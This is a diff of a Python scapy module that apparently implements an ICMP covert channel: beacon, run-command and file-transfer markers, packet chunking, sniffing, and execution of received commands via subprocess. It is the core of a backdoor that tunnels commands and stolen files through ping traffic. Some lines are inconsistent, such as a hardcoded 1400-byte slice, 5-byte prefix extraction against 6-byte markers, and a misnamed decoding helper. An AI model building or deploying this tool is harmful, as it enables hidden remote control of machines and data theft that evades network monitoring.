@@ -8,26 +8,27 @@ import threading
 from scapy.all import *
 import threading
 
-FILE = 0xcafe           # module to send file
-RUN = 0xbabe            # module to run command
-BEACON = 0xdead         # client is ready to recieve command
-BEGIN_OUTPUT = 0xAAA    # server to open output_file
-BEGIN_FILE = 0xBE       # server to open file - name of the file in the data
-IN_TRANSFER = 0xCCC     # server to continue writing to the opened file
-EF = 0xEF              # server to close the opened file
+FILE = b'filexx'           # module to send file
+RUN = b'runxxx'            # module to run command
+BEACON = b'beacon'          # client is ready to recieve command
+BEGIN_OUTPUT = b'begino'    # server to open output_file
+BEGIN_FILE = b'beginf'       # server to open file - name of the file in the data
+IN_TRANSFER = b'transf'      # server to continue writing to the opened file
+EF = b'eofeof'              # server to close the opened file
 
 SERVER_ADR = "127.0.0.1"
 ICMP_RESPONSE = "icmp[0]=0"
 ICMP_REQUEST = "icmp[0]=8"
 
 LOG_OUTPUT = ".log_output.txt"
+MTU_SIZE = 1500
+HEADER_SIZE = 100
 
 
-
-def pkt_send(dest,data,icmp_type,id_packet):
-    for chunk in range(0, len(data), 1400):
+def pkt_send(pkt_no_data,data):
+    for chunk in range(0, len(data), MTU_SIZE - HEADER_SIZE):
         x = chunk
-        pkt = IP(dst=dest)/ICMP(type=icmp_type,id=id_packet)/data[x:x+1400]
+        pkt = pkt_no_data/data[x:x+1400]
         send(pkt)
 
 def sniff_pkt(pfilter,handler,cnt=30,timer=1000):
@@ -37,11 +38,6 @@ def signal_handler(sig, frame):
     print(' Exiting...')
     sys.exit(0)
     
-def extract_data(packet):
-    try:
-        return packet[0][Raw].load
-    except:
-        return str(None)
     
 def RunCommand(cmd):
     return subprocess.getoutput(cmd)
@@ -62,8 +58,24 @@ def write_to_file(fd,to_write):
 def close_file(fd):
     os.close(fd)
     
-def check_type(packet):
+def check_prefix(packet):             #extract 5 first bytes from data
+    return packet[0][ICMP].load[:5]
+
+def extract_data(packet):           #extract data (all the data besides the first 5 bytes)
+    try:
+        return packet[0][Raw].load[5:]
+    except:
+        return str(None)
+
+def get_packet_id(packet):
     return packet[0][ICMP].id
+
+
+def str_to_binary(str):
+    return ' '.join(format(ord(x), 'b') for x in str)
+
+def bin_to_str(bin_data):
+    return bin_data.encode('utf-8')
 
 
     
